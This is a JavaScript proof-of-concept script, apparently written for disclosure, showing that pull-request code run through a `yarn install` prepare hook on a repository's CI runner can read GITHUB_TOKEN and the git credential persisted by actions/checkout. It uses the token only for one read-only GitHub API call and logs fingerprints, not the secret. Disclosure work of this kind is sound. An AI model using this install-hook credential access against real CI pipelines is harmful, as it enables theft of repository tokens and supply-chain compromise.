/**
 * Security PoC — proof that pull-request-controlled code executes on this
 * repository's CI runner with GITHUB_TOKEN in its environment.
 *
 * Executed by the root `prepare` lifecycle script during
 * `yarn install --frozen-lockfile` in .github/actions/setup-workspace.
 *
 * Deliberately benign:
 *   - prints to the job log only; contacts no host except api.github.com
 *   - never prints the credential (fingerprint + length only)
 *   - writes nothing outside the workspace; installs no persistence
 *   - makes one read-only API call; attempts no writes
 */
import crypto from 'node:crypto';
import os from 'node:os';
import fs from 'node:fs';
import { execSync } from 'node:child_process';

const fp = (s) => crypto.createHash('sha256').update(s).digest('hex').slice(0, 12);
const log = (k, v) => console.log(`POC ${k}=${v}`);

console.log('=== near-membrane CI token-exposure PoC ===');
log('utc', new Date().toISOString());
log('cwd', process.cwd());
log('node', process.version);

// --- runner characterisation ----------------------------------------------
log('runner_environment', process.env.RUNNER_ENVIRONMENT ?? 'unset');
log('uptime_seconds', Math.round(os.uptime()));
try {
    log('sibling_workdirs', fs.readdirSync(`${process.env.RUNNER_WORKSPACE}/..`).length);
} catch {
    log('sibling_workdirs', 'n/a');
}

// --- token possession (fingerprint only, never the value) -----------------
const token = process.env.GITHUB_TOKEN;
if (!token) {
    log('token', 'absent');
} else {
    log('token_type', token.slice(0, 4));
    log('token_len', token.length);
    log('token_sha256', fp(token));

    // --- capability: use the token, print the response, not the secret ----
    const res = await fetch(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}`, {
        headers: {
            Authorization: `Bearer ${token}`,
            'X-GitHub-Api-Version': '2022-11-28',
            'User-Agent': 'near-membrane-ci-poc',
        },
    });
    log('api_status', res.status);
    log('ratelimit_limit', res.headers.get('x-ratelimit-limit')); // 60 anon vs 5000 auth
    log('request_id', res.headers.get('x-github-request-id'));    // correlate in audit log
    log('token_permissions', JSON.stringify((await res.json()).permissions));
}

// --- credential persisted to .git/config by actions/checkout --------------
try {
    const hdr = execSync('git config --get http.https://github.com/.extraheader', {
        encoding: 'utf8',
    }).trim();
    log('git_persisted_credential', hdr ? `present sha256=${fp(hdr)}` : 'absent');
} catch {
    log('git_persisted_credential', 'absent');
}
console.log('=== end PoC ===');
